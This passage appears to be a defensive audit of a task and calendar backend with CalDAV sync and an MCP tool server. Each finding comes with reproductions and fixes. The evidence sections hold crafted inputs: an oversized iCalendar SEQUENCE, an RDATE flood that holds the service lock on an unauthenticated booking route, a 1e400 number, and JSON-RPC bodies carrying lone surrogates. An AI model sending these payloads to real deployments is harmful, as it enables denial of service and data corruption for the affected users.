<details><summary>Evidence</summary>

```
read.py:299-301  `def _int(comp, key): v = comp.get(key); return None if v is None else int(v)` and read.py:341 `f.sequence = _int(comp, "SEQUENCE")`.

One resource on the wire (vobject — Radicale's own parser — parses and round-trips it unchanged, verified):

    BEGIN:VEVENT\r\nUID:seq@x\r\nDTSTAMP:20260101T000000Z\r\n
    DTSTART:20260107T090000Z\r\nDTEND:20260107T093000Z\r\n
    SEQUENCE:99999999999999999999\r\nSUMMARY:Poison\r\nEND:VEVENT

Driven through the real SyncEngine against an in-memory DB with a stub DAV client serving that resource plus one ordinary event:

    pass 1: RAISED OverflowError: Python int too large to convert to SQLite INTEGER
       token now: tok-1
       cached items: []
    pass 2: RAISED OverflowError: Python int too large to convert to SQLite INTEGER
       token now: tok-1
       cached items: []

The token is stuck at tok-1 and the *good* event that arrived in the same batch is never cached either. Traceback bottom: `store.py:290 conn.execute(...) -> OverflowError`, raised from `sync/engine.py:256 store.upsert_item(...)`, i.e. after the `except Exception` at engine.py:244 has already closed.
```

</details>

**Suggested fix.** Bound the value where it enters, mirroring the precedent at dav/client.py:163-166: in
`_int`, return None when the parsed int falls outside SQLite's signed 64-bit range (or
the RFC 5545 INTEGER range -2147483648..2147483647). Separately, move
`store.upsert_item` inside `_upsert_body`'s `try/except Exception` so any other bind
failure on a foreign body is counted as a skipped resource rather than aborting the pass
and freezing the sync token.

#### [x] A large RDATE list bypasses every up-front expansion guard: 3.3 s and ~70 MB under the global lock per unauthenticated booking request
`backend/tasksd/ical/recur.py:274` · **high** · security

`_pathological_rule` judges only RRULE shapes — it iterates VEVENTs, does `rrules =
comp.get("RRULE")`, and `continue`s when there is none. A recurrence set built from
RDATE alone (or an RRULE plus a huge RDATE) is therefore never priced. Its own docstring
states the reason that matters here: "The occurrence cap bounds how many results are
*kept*, not the work done to find them" and "`query.between` materializes the whole
expansion before the cap is consulted." That is exactly what happens for RDATE —
`expand_occurrences` builds every component, then raises at recur.py:534 only after the
cap is exceeded, so the CPU and RSS are spent in full first. The path is `GET
/api/public/booking/{token}` -> `public_link_info` -> `_link_busy` -> `events_in_range`,
and `_link_busy` (service.py:1064) holds `self._lock` across every collection, so the
cost is paid inside the global service lock on an unauthenticated request. The public
GET limiter is 120 requests / 300 s per IP (app.py:1767), so one IP can hold the lock
for ~400 s out of every 300 s window with a single planted resource.

<details><summary>Evidence</summary>

```
recur.py:273-277
    for comp in cal.walk("VEVENT"):
        rrules = comp.get("RRULE")
        if rrules is None:
            continue

Measured on the audit copy, one VEVENT whose RDATE lists N instants one second apart inside the query window (DTSTART/DTEND ordinary, 5 minutes):

    n= 10000    166 KiB   0.75s  rss 21->44 MB   ValueError (cap)
    n= 40000    664 KiB   3.18s  rss 44->117 MB  ValueError (cap)
    n=100000   1660 KiB   7.82s  rss 117->263 MB ValueError (cap)

End to end through the service, with the resource cached exactly as sync would cache it (`has_rrule=True`, `min_instant=2026-08-01T00:00:00+00:00`):

    events_in_range(cal, "2026-08-01T00:00:00", "2026-08-03T00:00:00", blocking=True)
    -> "recurrence expansion failed for flood@x; showing master"
    -> took 3.35s -> 1 dto (opaque busy span over the whole window)

A 664 KiB .ics is nothing for a CalDAV PUT. Test gap that let this through: the pathology battery in tests/test_recur.py (lines 201-292 and 1335-1391) prices only RRULE shapes — density, INTERVAL, ancient DTSTART, never-matching rules. Nothing in the suite asserts any time or memory bound for an RDATE-driven recurrence set.
```

</details>

**Suggested fix.** Give `_pathological_rule` an RDATE arm: count the RDATE values on every VEVENT (via the
raw content lines, or `sum(len(getattr(e, 'dts', []) or []) for e in rdate_props)`) and
refuse the resource when the total exceeds the window's occurrence cap, before
`recurring_ical_events.of(...)` is ever built — the same up-front, shape-only decision
the RRULE arms already make. Add a timing test alongside
`test_dense_rule_with_ancient_dtstart_is_refused_promptly`.

#### [x] smylte_update_day_entry accepts a non-finite position, which persists as Infinity and 500s every later read of that day
`backend/tasksd/mcp/tools.py:536` · **high** · bug

The MCP schema for smylte_update_day_entry declares `"position": {"type": "number"}`
with no bounds, and mcp/validate.py has no notion of finiteness — it only checks `type`,
`enum`, `minimum/maximum`, `minLength/maxLength`, `pattern` and `items`. The HTTP twin
of the exact same write, `PatchDayEntry.position` (backend/tasksd/app.py:352), carries
`Field(default=None, allow_inf_nan=False)` with a comment naming this precise failure
("one Infinity here would 500 every later read of the whole day"), and
test_api.py::test_required_window_bounds_and_non_finite_sidecar_are_422 pins it for the
sibling `Sidecar.sort_order`. server.parse_body's `parse_constant=_reject_constant`
blocks only the bare `NaN`/`Infinity` literals; `1e400` is an ordinary number literal
that `json.loads` overflows to `inf`, and server.py's own comment says so. The inf
reaches service.patch_day_entry, which does `fields["position"] = float(position)` and
stores it in the app-only day_plan table — the one part of SQLite a resync cannot
rebuild.

<details><summary>Evidence</summary>

```
Reproduced against a real TaskService (no Radicale needed; day plan is SQLite-only). Raw body posted through the real parse path:

  {"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"smylte_update_day_entry","arguments":{"entry_id":"<id>","position":1e400}}}

parse_body -> position == inf; check_value passes (`_type_ok(inf, "number")` is True, no minimum/maximum); api.update_day_entry -> svc.patch_day_entry -> `fields["position"] = float(inf)` -> stored.

Rendering the reply the way routes.py does (`JSONResponse(out)`, i.e. `json.dumps(..., allow_nan=False)` at starlette/responses.py:198) raises:
  RENDER FAILED: Out of range float values are not JSON compliant: inf

And every subsequent read is now unrenderable too:
  GET_TODAY RENDER FAILED: Out of range float values are not JSON compliant: inf

So POST /mcp 500s *after* the write committed, and from then on both smylte_get_today and GET /api/day/{day} 500 for that day — the owner cannot even read the entry_id back out of the app to repair it. The HTTP route rejects the identical value with a 422.
```

</details>

**Suggested fix.** Give the MCP `position` schema real bounds the validator can enforce (e.g. `"minimum":
-1e9, "maximum": 1e9`), and/or teach validate.check_value to reject non-finite floats
for `type: number` — the same rule `allow_inf_nan=False` states on the HTTP model. A
guard in McpApi.update_day_entry (`if position is not None and not
math.isfinite(position): raise ToolError(...)`) is the minimal fix.

#### [x] Every DavError message carries the absolute internal Radicale URL, and app.py returns it verbatim as the 404 body
`backend/tasksd/dav/client.py:323` · **medium** · security · minor

`_raise_for` builds its message from `resp.request.url` — the fully-resolved internal
URL, i.e. the Radicale origin, the Radicale account name, the collection UUID and the
resource slug. For `AuthError`, `Conflict` and the `DavError` catch-all this is harmless
because app.py replaces the body with a fixed sentence, but `DavNotFound` is handled at
app.py:1088-1090 as `JSONResponse(status_code=404, content={"detail": str(exc)})` — the
raw message goes straight out to the client. This is the sibling of the already-fixed
"anonymous booking POST answers 409 with the owner's internal CalDAV href" finding: that
one was closed by rewording the `ConflictError` in `_put_new`, but the 404 route still
ships the href. On the unauthenticated surface it is reachable whenever any DAV round-
trip inside `book_slot` 404s — the target calendar removed by another CalDAV client
inside the ≤ `sync_interval_s` (30 s default) window during which `_link_is_live`'s
cache-backed `has_collection` still says the link is live, or the just-written resource
deleted between `_put_new`'s PUT and `_refresh_from_wire`'s read-back (engine.py:641).
It is also a plain UX defect for the owner: deleting a task on the phone and then
ticking it complete in the still-open tab drives `_edit`'s 412 branch into
`self.dav.get(href)` (engine.py:594), and the toast reads `GET
http://127.0.0.1:5232/testuser/9f3e…/ab12cd.ics -> 404`.

<details><summary>Evidence</summary>

```
client.py:321-328

    def _raise_for(resp: httpx.Response) -> None:
        status = resp.status_code
        msg = f"{resp.request.method} {resp.request.url} -> {status}"   # <-- absolute internal URL
        body = resp.text[:500]
        ...
        if status == 404:
            raise NotFound(msg, status=status, body=body)

app.py:1088-1090

    @app.exception_handler(DavNotFound)
    async def _dav_not_found(request: Request, exc: DavNotFound):
        return JSONResponse(status_code=404, content={"detail": str(exc)})

Reproduced through the real app (script at /tmp/claude-0/-home-user-smylte/e3078780-8be9-5e55-813c-5e8f796288f0/scratchpad/agent-scratch/poc_leak.py — TestClient + an httpx MockTransport that 404s):

    login 200
    POST /api/lists -> 404 {"detail":"MKCALENDAR http://radicale.internal:5232/testuser/e155740bf9474ab8ab3fcf165e0d78a1/ -> 404"}

The body discloses the CalDAV origin, the Radicale username and a collection id — exactly the material `test_public_page_requires_no_auth_and_leaks_nothing` was written to keep off the public route. (The MCP surface is unaffected: mcp/server.py:222 collapses every non-ToolError to a generic sentence naming only the exception class.)
```

</details>

**Suggested fix.** Return a fixed detail from the `DavNotFound` handler (e.g. "that item is no longer on
the calendar server") and log `str(exc)` instead, matching what `_dav_auth`/`_dav_error`
already do. Optionally also drop the absolute URL from `_raise_for`'s message in favour
of the method plus the href the caller passed, so no future handler can leak it by
echoing `str(exc)`.

#### [x] A time-only drag skips the desynchronization check entirely, so a BYHOUR/BYMINUTE rule moves only the dragged occurrence and silently gains an extra one
`backend/tasksd/ical/edit.py:1162` · **medium** · bug · stage 3

```python _DAY_SELECTING = ("BYMONTHDAY", "BYYEARDAY", "BYWEEKNO", "BYMONTH",
"BYSETPOS") def _desynchronizing(rule, day_delta, new_weekday=None): if not day_delta:
return None # a time-only drag moves nothing else ``` `_shift_rrule`'s own docstring
spells out the failure this guard exists to prevent:
"`FREQ=MONTHLY;BYMONTHDAY=6;COUNT=4` by a day turned Jan 6/Feb 6/Mar 6/Apr 6 into Jan
7/Feb 6/Mar 6/Apr 6/**May 6** — five occurrences instead of four, only the dragged one
moved, and a May the user never asked for, because COUNT is now consumed from a later
start." The identical failure exists for the TIME-selecting parts, and the guard cannot
see it twice over: `_DAY_SELECTING` contains no `BYHOUR`/`BYMINUTE`/`BYSECOND`, and the
early return above bails out before the loop whenever the drag changed only the time of
day — which is precisely when a BYHOUR rule desynchronizes. `shift_series` moves DTSTART
(and every EXDATE, RDATE and RECURRENCE-ID) while the rule keeps naming the old hour.

<details><summary>Evidence</summary>

```
Reproduced against the audit copy, judged by `expand_occurrences`:

```
DTSTART:20260105T090000Z
DTEND:20260105T100000Z
RRULE:FREQ=WEEKLY;BYDAY=MO;BYHOUR=9;COUNT=4
```
Before: `2026-01-05T09:00`, `01-12T09:00`, `01-19T09:00`, `01-26T09:00` (4).

Drag the Jan 5 chip 09:00 → 11:00, scope "all events" →
`shift_series(raw, "2026-01-05T09:00:00+00:00", EventEdit(dtstart=2026-01-05T11:00+00:00))`

After: `2026-01-05T11:00`, `01-12T09:00`, `01-19T09:00`, `01-26T09:00`, **`2026-02-02T09:00`** (5).
Only the dragged occurrence moved, and a fifth occurrence the user never asked for appeared, because COUNT is now consumed from a later start. `day_delta == 0`, so `_desynchronizing` returned None and `_shift_rrule` wrote the rule back unchanged.

Same with `RRULE:FREQ=DAILY;BYMINUTE=0;COUNT=4` dragged +30 min: `01-05T09:30`, `01-06T09:00`, `01-07T09:00`, `01-08T09:00`, **`01-09T09:00`**.

`split_series` calls `_shift_rrule` too (edit.py:1685), so "this and following" with a time change corrupts the tail the same way. The bytes go to Radicale, so the loss is permanent and visible in every other client.
```

</details>

**Suggested fix.** Give `_desynchronizing` the time half of the delta as well as `day_delta`, and refuse
when the time-of-day changed while the rule carries `BYHOUR`/`BYMINUTE`/`BYSECOND` — the
same refusal (and the same 422 wording) the day-selecting parts already get: "cannot
move a series whose repeat rule pins it to a particular time (BYHOUR); edit the
occurrence instead, or change the repeat". Keep the `day_delta == 0` early return only
for rules with no time-selecting part.

**Pinned by** `test_a_time_only_drag_of_a_time_pinned_series_neither_desynchronizes_it_nor_gains_an_occurrence` in `backend/tests/test_backlog_aug25_stage3.py`.

**Fixed** as suggested: `_desynchronizing` now takes the TIME half of the delta as well as `day_delta`, refuses on `BYHOUR`/`BYMINUTE`/`BYSECOND` when the wall-clock time of day moved, and keeps the `day_delta == 0` early return only after those have had their say. The refusal reuses the day-selecting wording with the axis swapped — "pins it to a particular time (BYHOUR)" — and `patch_event` maps it to 422 like the other.

`time_changed` is `bool(delta.seconds or delta.microseconds)`, which reads correctly for a backwards drag: `timedelta` normalises to non-negative sub-day parts, so -2h is `timedelta(days=-1, seconds=79200)`.

**The CONDITION is the fix, and a mutation proves it.** Refusing on the mere PRESENCE of a time-selecting part flips the pin and fails the control: a DAY-only drag of `FREQ=WEEKLY;BYDAY=MO;BYHOUR=9` desynchronizes nothing — the hour the rule names is still the hour DTSTART lands on — and must still rotate. Deriving `time_changed` from `delta.days` instead fails the pin, the control and the split test together.

**The `split_series` half named at the foot of this entry is closed by the same change and now has its own test.** "This and following" with a time change went through `_shift_rrule` too and corrupted the tail — the part the user keeps — identically. One guard covers both because both call it, and the new parametrized test says so rather than leaving it to be inferred, with an ordinary rule beside it that must still split.

Also checked by hand, none of it reachable from the pin: an all-day series carrying `BYHOUR` dragged a whole day is NOT refused; a drag that changes both day and time is refused on the time axis; `BYMINUTE` and `BYSECOND` behave like `BYHOUR`. The change is purely additive — a new refusal branch — so every path it does not refuse is byte-identical to before.

#### [x] RDATE;VALUE=PERIOD writes a Python tuple repr into min_instant, so the resource becomes a candidate for every window forever
`backend/tasksd/ical/read.py:424` · **medium** · bug · minor

`_min_instant` folds every DTSTART and every RDATE entry through `_iso`, whose fallback
branch (read.py:91) is `return str(dt), False` for anything that is not a
`date`/`datetime`. A `VALUE=PERIOD` RDATE has a tuple `.dt`, so `_iso` returns its
Python repr — `"(datetime.datetime(2026, 2, 10, 9, 0,
tzinfo=zoneinfo.ZoneInfo(key='UTC')), datetime.timedelta(seconds=7200))"`.
`_min_instant` then compares it as a string (read.py:425), and `(` (0x28) sorts below
every digit, so that repr always wins and lands in the `min_instant` column.
`store.get_events_in_range` gates recurring rows on `COALESCE(min_instant, dtstart) <=
?` (store.py:1136-1137), and that repr is `<=` every possible bound — so the resource is
admitted as a candidate for EVERY window, including windows centuries away. That is
precisely the state store.py's own docstring says is unaffordable: "Admitting them
unconditionally instead was the first attempt and it is not affordable ... Measured, 50
far-future never-matching series ... went from 0 candidate rows to 50, and a two-day
booking window from ~0 s to 9.13 s" — and `_link_busy` runs one expansion per candidate
row while holding the global lock, on the unauthenticated booking routes. The same
fallback also leaks the repr into the `dtstart` column (and thus into the API's `start`
field) for a `DTSTART;VALUE=PERIOD`.

<details><summary>Evidence</summary>

```
read.py:83-91 (`_iso` ... `return str(dt), False`) and read.py:423-426:
    for c in candidates:
        if c is None: continue
        value = _iso(c)[0]
        if isinstance(value, str) and (best is None or value < best):
            best = value

Reproduced against the real schema and the real store query. Two identical weekly series, one carrying `RDATE;VALUE=PERIOD:20260210T090000Z/PT2H`:

    per@x:   min_instant="(datetime.datetime(2026, 2, 10, 9, 0, tzinfo=zoneinfo.ZoneInfo(key='UTC')), datetime.timedelta(seconds=7200))"
    plain@x: min_instant='2026-01-06T09:00:00+00:00'

    store.get_events_in_range(conn, "/cal/", "1820-01-01", "1820-02-01")
    -> candidates for 1820 window: ['per@x']

RDATE;VALUE=PERIOD is treated everywhere else in this repo as ordinary foreign-client output (tests/test_recur.py:858-893, tests/test_backlog_aug19_stage3_ical.py:1147-1165). Test gap: `grep -rn min_instant tests/` returns nothing — the column that decides which recurring resources reach the unauthenticated booking conflict check is asserted nowhere in the suite.
```

</details>

**Suggested fix.** In `_min_instant`, resolve each candidate to a real instant before comparing: take `dt =
getattr(c, 'dt', c)`, use `dt[0]` when it is a tuple (a PERIOD's start is its earliest
instant — skipping the entry instead would push `min_instant` too HIGH and could drop a
resource whose only early instant is that period), and ignore anything that is still not
a `date`/`datetime`. Add a test asserting `min_instant` for a PERIOD RDATE and for an
override moved before the master DTSTART.

#### [x] A JSON-RPC id (or method name, or unknown argument name) containing a lone surrogate 500s POST /mcp after the tool has already run
`backend/tasksd/mcp/server.py:69` · **medium** · bug

`_usable_id` exists precisely because "the id is a REPLY ADDRESS, and it is echoed into
every envelope this returns" — but it accepts *any* `str` unconditionally: ```python def
_usable_id(rid) -> bool: if rid is None or isinstance(rid, str): return True ``` The
guard was written for non-finite floats and stops there. A string id containing an
unpaired surrogate (`"\ud800"`, which `json.loads` accepts and returns verbatim)
survives `handle`, is echoed into `_result`/`_error`, and dies in `JSONResponse(out)` at
routes.py:506, whose `render` does `json.dumps(..., ensure_ascii=False).encode("utf-8")`
-> `UnicodeEncodeError`. That happens after the whole dispatch has completed, so the
failure mode is exactly the one the NaN-id fix documents in the comment at
server.py:110-118: "For tools/call that lands AFTER the tool has run, so a real write
committed while its caller was told the call failed; in a batch, one poisoned id
discarded all 50 replies." Two more strings on the same path are interpolated raw rather
than repr'd, so they crash the same way even with a clean id: * `_error(rid,
METHOD_NOT_FOUND, f"unknown method: {method}")` (server.py:155) and `f"{method} failed:
{type(exc).__name__}"` (server.py:166) * `validate.check_arguments`'s `f"{tool} has no
argument(s) {', '.join(unknown)}"`, whose `unknown` are caller-supplied JSON object
keys, reaching the wire via `_error(rid, INVALID_PARAMS, str(exc))` (server.py:160)
Unlike the `/oauth/register` twin, this surface is only reachable with a valid bearer
token — but the trust model puts the LLM driving these tools in the adversary set, and
models do emit broken surrogate pairs around emoji, so an accidental trigger is
realistic, not just a deliberate one.

<details><summary>Evidence</summary>

```
Reproduced against the audit copy after a full connector flow (register -> consent -> PKCE exchange), `TestClient(..., raise_server_exceptions=False)`:

```
POST /mcp  Authorization: Bearer <token>
{"jsonrpc":"2.0","id":"\ud800","method":"tools/call",
 "params":{"name":"smylte_list_lists","arguments":{}}}
->  500 'Internal Server Error'

# the identical call with a clean id proves the tool ran to completion:
{"jsonrpc":"2.0","id":1,"method":"tools/call",
 "params":{"name":"smylte_list_lists","arguments":{}}}
->  200 {"jsonrpc":"2.0","id":1,"result":{..."structuredContent":{"lists":[]}...}}

# one poisoned id sinks a whole batch:
[{"jsonrpc":"2.0","id":1,"method":"ping"},
 {"jsonrpc":"2.0","id":"\ud800","method":"ping"}]
->  500 'Internal Server Error'   (the well-formed ping's reply is lost too)

# unknown argument name, clean id:
{"jsonrpc":"2.0","id":1,"method":"tools/call",
 "params":{"name":"smylte_list_lists","arguments":{"\ud800bad":1}}}
->  500  (UnicodeEncodeError out of JSONResponse.render)

# unknown method, clean id:
{"jsonrpc":"2.0","id":4,"method":"\ud800nope"}   ->  500
```

Inputs -> wrong result: substitute `smylte_create_task` for `smylte_list_lists` in the first case and the task is created in CalDAV while the client receives a 500 and, on retry, creates it a second time — the duplicate-write scenario the NaN-id fix was written to prevent, still open for string ids.
```

</details>

**Suggested fix.** Fix at the renderer so all three vectors close at once: render `/mcp` (routes.py:506)
with `json.dumps(content, ensure_ascii=True, allow_nan=False, separators=(",",
":")).encode()` instead of Starlette's default `JSONResponse`. Additionally tighten
`_usable_id` to reject an id that cannot round-trip (`isinstance(rid, str)` and
`rid.encode("utf-8", "strict")` succeeding), so a client that sends an unaddressable id
gets the existing `-32600 "id must be a string, a finite number, or null"` answer rather
than a 500. A regression test should send a lone surrogate as (a) an id, (b) a method
name and (c) an argument key — none of the JSON-RPC framing tests at
tests/test_mcp.py:819-934 covers non-UTF-8-encodable text.

#### [x] One VTODO another CalDAV client wrote with a PERIOD- or DURATION-valued DUE kills smylte_list_tasks for the whole account
`backend/tasksd/mcp/api.py:142` · **medium** · bug

`_due_instant` (called from `_intrinsic_order`, which `_in_display_order` applies to
EVERY row on every smylte_list_tasks call) hands the CACHED due value to `_parse_dt`,
and `_parse_dt` raises ToolError on anything it cannot read. The cached value is not
app-written: ical/read.py:83 `_iso()` falls back to `str(dt)` for any DUE whose parsed
value is neither a date nor a datetime, and icalendar happily parses
`DUE;VALUE=PERIOD:...` into a tuple and `DUE;VALUE=DURATION:PT1H` into a timedelta.
Neither `"(datetime.datetime(...), datetime.datetime(...))"` nor `"1:00:00"` survives
`date.fromisoformat`/`datetime.fromisoformat`, so the sort key function raises inside
`sorted()` and the whole tool fails. The same raise also fires in the filter loop at
api.py:416. The trust model names VALUE=PERIOD explicitly as hostile-shaped input from
adversary (b), and service._completions_by_day already applies the correct fail-soft
rule (`except ValueError: continue`) to `completed_at` two hundred lines away.

<details><summary>Evidence</summary>

```
Seeded through the real cache path (store.upsert_item + extract_from_raw), one foreign VTODO:

  BEGIN:VTODO\r\nUID:bad\r\n...DUE;VALUE=PERIOD:20260101T000000Z/20260102T000000Z\r\nEND:VTODO

Before: smylte_list_tasks -> {"total": 2, "count": 2, ... [ok1, ok2]}
After seeding `bad`:
  svc.list_tasks(LIST_A)            -> ['bad','ok1','ok2']   (HTTP route and SPA unaffected)
  smylte_list_tasks {}              -> isError:true, "due=\"(datetime.datetime(2026, 1, 1, 0, 0, tzinfo=zoneinfo.ZoneInfo(key='UTC')), datetime.datetime(2026, 1, 2, 0, 0, tzinfo=zoneinfo.ZoneInfo(key='UTC')))\" is not a date I can read. Use 'YYYY-MM-DD' ..."
  smylte_list_tasks {overdue_only}  -> same failure

`DUE;VALUE=DURATION:PT1H` caches as "1:00:00" and fails identically. Because list_tasks with no list_id spans every list, one poisoned task blinds the tool for the entire account, and the message tells the model to fix a `due` argument it never sent.
```

</details>

**Suggested fix.** Make the cached-value parse fail-soft: in `_due_instant`, wrap the `_parse_dt` call (or
use a `_parse_dt_or_none` variant) so an unreadable stored DUE is treated as "no due
date" — sorting last — exactly as `_completions_by_day` already does for `completed_at`.
Do the same for the `due` read in the filter loop at api.py:416. Keep the raising form
only for values the CALLER supplied (due_before/due_after/create/update).

#### [x] smylte_list_tasks' due filters resolve in the server's timezone while its ordering was fixed to the owner's, so a Friday-evening deadline is filtered as Saturday's
`backend/tasksd/mcp/api.py:403` · **medium** · bug · stage 3

`_due_instant` was deliberately changed to resolve a deadline in `home_timezone` (its
docstring: "`_as_dt` resolved both against the SERVER's ... and the two only agree when
the two zones do. With the browser in America/Chicago and the server in UTC, which is
the ordinary Docker deployment ..."). The FILTERS in the same function were left on
`_as_dt`, which converts a zone-aware due to the SERVER's local wall clock
(`value.astimezone().replace(tzinfo=None)`), and `overdue_only` compares against
`datetime.now()` — also the server's clock. So the same tool call sorts a task by one
zone and filters it by another, and it disagrees with service._due_day (which converts
to home_timezone before taking the calendar day) about which day a task is due.

<details><summary>Evidence</summary>

```
Reproduced with TZ=UTC (the ordinary Docker deployment) and home_timezone="America/Chicago", one foreign VTODO carrying an instant:

  DUE:20260822T030000Z        # = 2026-08-21 22:00 in the owner's own zone
  DUE;VALUE=DATE:20260821     # control

  api.list_tasks(None, due_before="2026-08-22") -> ['anchor']    # the 22:00 Friday task is MISSING
  api.list_tasks(None, due_after="2026-08-22")  -> ['evening']   # and is reported as Saturday's

The SPA, service._due_day and `_intrinsic_order`/`_due_instant` all file that task on the 21st. A model asked "what is due before Saturday" is told the Friday-evening deadline does not exist. `overdue_only` has the same skew against `datetime.now()`: for the first five hours of every UTC day, a date-only task due today in Chicago is reported overdue.
```

</details>

**Suggested fix.** Resolve the filter bounds and the deadline in the same zone the ordering uses: compute
`zone = self._home_zone()` once in `list_tasks` and compare instants via
`_due_instant`-style resolution (or an `_as_dt(value, zone)` that attaches `zone` to
naive values and converts aware ones into it) for `due_before`, `due_after` and the
`now` used by `overdue_only`.

**Pinned by** `test_the_due_filters_file_a_deadline_on_the_day_the_owner_sees` in `backend/tests/test_backlog_aug25_stage3.py`.

**Fixed** with the suggested fix's second shape — a zone-carrying resolution, not a second `_as_dt`. Three helpers in front of `_due_instant` collapse the two drifting answers into one: `_instant_in(value, zone)` attaches `zone` to a naive value and returns a POSIX instant, `_bound_instant` parses a filter bound through it, and `_due_parts(raw, zone)` returns a deadline as `(due_at, overdue_at)`. `_due_instant` now delegates to `_due_parts`, so the ordering and the filters cannot drift apart again by construction — there is one resolution and both read it. `list_tasks` computes `zone = self._home_zone()` once and compares instants, never wall clocks.

**`overdue_only` was brought into scope and follows the app's own rule rather than a third one.** `util.ts::isOverdue` says an all-day item is not overdue until its whole day has passed, and `service._due_day` takes the calendar day in `home_timezone`; `_due_parts` gives a date-only deadline an `overdue_at` of the START OF THE NEXT DAY IN THAT ZONE, which is both rules at once. The pin deliberately left this half unpinned because the answer depended on a decision; adopting the day rule is what made it deterministic enough to test, and that is the point worth recording — under the old "midnight UTC" reading, whether today's date-only task is overdue depends on what hour the test runs, so there was nothing to assert. Under this one, today's is never overdue and yesterday's always is, at any hour, and `test_overdue_only_waits_for_the_owners_day_to_end` says so.

**The day is as long as the owner's day actually is.** `overdue_at` is `_instant_in(value + timedelta(days=1), zone)` — a CALENDAR day, resolved in the zone — not `due_at + 86400`. A mutation to the flat-86400 form passed the whole suite, because nothing in it ran across a DST boundary; `test_a_deadlines_day_is_as_long_as_the_owners_day_actually_is` now pins 23 h on 2026-03-08, 25 h on 2026-11-01 and 24 h on an ordinary day, and catches it. The other two mutations — bounds resolved on the server's wall clock, and a date-only deadline overdue from midnight — are caught by the pin and by the `overdue_only` test respectively.

#### [x] smylte_review_day over a range re-reads every task of every named list once per day — 6.6 s under the service lock where the HTTP twin takes 3 ms
`backend/tasksd/mcp/api.py:1313` · **medium** · bug · stage 2

`review_day`'s range arm calls `self._entries_with_tasks(plan["entries"])` inside the
per-day loop. Each call resolves the lists named on that day and calls
`self._svc.list_tasks(href, include_done=True)` for each — a full `store.get_items` of
the collection (raw_ics included, under `self._lock`) plus a `_task_dto` for every row —
and then throws the map away. `day_range` is bounded at DAY_RANGE_MAX_DAYS = 190, so the
cost is O(days x lists x tasks) for a single read-scoped tool call whose arguments the
model chooses. The HTTP route that answers the same question, `GET /api/day?from=&to=`
(app.py:1319), does no task join at all.

<details><summary>Evidence</summary>

```
Real TaskService, 2000 VTODOs in one list, one task entry per day, measured:

  days=  1 returned=  1 elapsed=0.06s
  days= 30 returned= 30 elapsed=1.01s
  days=180 returned=180 elapsed=6.63s
  HTTP twin svc.day_range(180d): 0.003s

Exactly linear in days x tasks. With entries spanning three lists it is three times that. `smylte_review_day {"from":"2026-01-01","to":"2026-06-30"}` is a single tool call, and the MAX_RESULT_CHARS backstop only fires after the work is already spent.
```

</details>

**Suggested fix.** Hoist the join out of the loop: collect `{e["list"] for p in plans for e in p["entries"]
if e["kind"]=="task"}` once for the whole range, build `by_key` once, and have
`_entries_with_tasks` accept a prebuilt map (the same shape `service.search` was already
fixed into — "built ONCE per collection").

**Pinned by** `test_a_range_review_reads_each_list_once_not_once_per_day` in `backend/tests/test_backlog_aug25_stage2.py`.

**Fixed** as suggested — the join is hoisted out of the per-day loop — with the map lifted into a named `_task_index(list_ids)` and `_entries_with_tasks` given an OPTIONAL prebuilt index. Optional rather than required because the map a single day needs is exactly the map that function would build for itself, so a caller with one day to answer about should not have to know the parameter exists.

`today()` got the same treatment, which the finding does not mention: it calls `_entries_with_tasks` TWICE on an unplanned day — once for the plan, once for the preview — so it read every task of every named list twice for one tool call. The preview is now resolved before the join and both share one index.

The pin counts CALLS, and a hoist that builds the wrong map satisfies it while answering `task: null` for every row — so a CONTROL was added beside it asserting that the range arm and the single-day arm give the same answer, bucket for bucket. Its first draft spanned one day and passed a deliberately wrong hoist (first-day lists only); it now spans two days that name DIFFERENT lists, and catches that mutation, an empty index, and a per-day rebuild.

#### [x] smylte_list_events orders by raw ISO string, so zone-anchored events come back in the wrong order and `limit` returns the wrong page
`backend/tasksd/mcp/api.py:554` · **medium** · bug

`list_events` merges every calendar's rows and sorts with `key=lambda r: (r.get("start")
or "", r.get("summary") or "")` — a lexical compare over `items.dtstart`, which is
`dt.isoformat()` and therefore carries whatever offset the writing client used.
`_intrinsic_order`'s own docstring in this same file says why that is wrong ("lexical
comparison happens to agree for ISO values of equal shape and stops agreeing the moment
a date-only and a timed value meet, or an offset appears") and the tasks path was fixed
for it; the events path was not. tools.py then slices this list with `page(...)`, so the
order decides which occurrences a `limit` keeps. There is also no uid/recurrence_id tie-
break, unlike `_intrinsic_order`.

<details><summary>Evidence</summary>

```
Two foreign events in one calendar:
  berlin: DTSTART;TZID=Europe/Berlin:20260821T090000   (= 07:00Z, genuinely FIRST)
  utcone: DTSTART:20260821T080000Z                     (= 08:00Z, genuinely second)

  api.list_events("2026-08-20","2026-08-23")
    -> [('utcone','2026-08-21T08:00:00+00:00'), ('berlin','2026-08-21T09:00:00+02:00')]

  smylte_list_events {"start":"2026-08-20","end":"2026-08-23","limit":1}
    -> events[0].uid == 'utcone'

The model asking for the next meeting, or reading only page one, is handed the later event and never sees the earlier one. The same happens between a floating time and a UTC one.
```

</details>

**Suggested fix.** Sort on the parsed instant, the way `_intrinsic_order` does: key on
`(_as_dt(_parse_dt(r.get("start"))) or datetime.min, r.get("summary") or "", r.get("id")
or "")`, with an unreadable start degrading to a sentinel rather than raising, and keep
the `id` tie-break so paging is a total order.

#### [x] move_event has no replay tolerance: a failure between the destination PUT and the source DELETE duplicates the event and makes every retry a permanent 409
`backend/tasksd/sync/engine.py:406` · **low** · bug · stage 3

`move_event` is copy-then-delete. The destination PUT is `if_none_match="*"`, and ANY
412/409 on it is turned into a terminal `ConflictError`. But the destination href is
deterministic (`new_href = f"{dst_href}{basename}"` where `basename` comes from the
unchanged source cache row), so once the copy has landed, every subsequent attempt at
the same move hits its own copy and answers 409 forever. Meanwhile the source delete on
line 419 is only rolled back for `PreconditionFailed` — any other failure (transport
error / lost response, 403, 423) leaves the copy in place and propagates, so the event
now exists in BOTH calendars with no way to complete the move. `_put_new` (line 341-364)
solves exactly this problem for creates: on a 412 it GETs the occupant and treats it as
success when the UID is ours ("a replay finds the resource already on the server — that
is the create succeeding, not a conflict, as long as the occupant is ours").
`move_event` never got that treatment, even though this same `except` clause was edited
to add `Conflict` (the no-uid-conflict fix). The message the caller gets is actively
misleading. Over HTTP the retry is 409 "event {uid} already exists in the target
calendar", which reads as "the move is already done" while the source copy is still
there. Over MCP it is worse: `mcp/server.py:222-229` has no `ConflictError` branch, so
`smylte_move_event` reports "could not be completed (ConflictError). The calendar server
may be unreachable; try again shortly" — an explicit invitation for the LLM to retry a
call that can never succeed, while the event silently sits in two calendars.

<details><summary>Evidence</summary>

```
engine.py:404-419

